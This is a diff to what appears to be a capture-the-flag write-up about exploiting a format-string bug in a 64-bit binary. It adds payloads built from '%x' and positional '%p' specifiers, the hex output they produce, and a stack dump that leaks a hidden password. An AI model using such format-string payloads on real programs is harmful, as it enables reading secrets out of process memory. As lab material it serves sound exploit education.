@@ -290,3 +290,34 @@ Tried to print string at all the addresses
 ```
 
 This address just causes the program to hang f.
+
+```
+password = b"ABCDEFGHIJKL" + b"%x" * 26
+ABCDEFGHIJKLfdc20ea041ffffffff7630606001e774582a07369687464726f7764656b6163617473747365740000000000009c044434241
+
+password = b"ABCDEFGHIJKL" + b"%x" * 28
+ABCDEFGHIJKLc4d4a99041ffffffff8b6a506001e8ca312a07369687464726f7764656b6163617473747365740000000000009c0444342414c4b4a4978257825
+
+password = b"ABCDEFGHIJKL" + b"_%26$X_%27$X_%28$X"
+ABCDEFGHIJKL_44434241_4C4B4A49_255F5824
+```
+
+The machine is of 64 bit architecture, thus we need to use %p with 16 lenght padding:
+
+```
+   2:  0000000000000025  %\x00\x00\x00\x00\x00\x00\x00
+   3:  00000000ffffffff  \xff\xff\xff\xff\x00\x00\x00\x00
+   6:  000000090000001e  \x1e\x00\x00\x00\x09\x00\x00\x00
+   8:  7373617073696874  thispass
+   9:  656c736964726f77  wordisle
+  10:  6d6f726664656b61  akedfrom
+  11:  0000006b63617473  stack\x00\x00\x00
+  12:  6873696a61727573  surajish
+  13:  0000000000000069  i\x00\x00\x00\x00\x00\x00\x00
+  24:  000009c000000000  \x00\x00\x00\x00\xc0\x09\x00\x00
+  25:  000009c0000009c0  \xc0\x09\x00\x00\xc0\x09\x00\x00
+  26:  7038313024363225  %26$018p
+ 10%|██████▍                                                           | 25/256 [00:02<00:24,  9.33it/s]
+ ```
+
+As we can see the password has been leaked from the stack
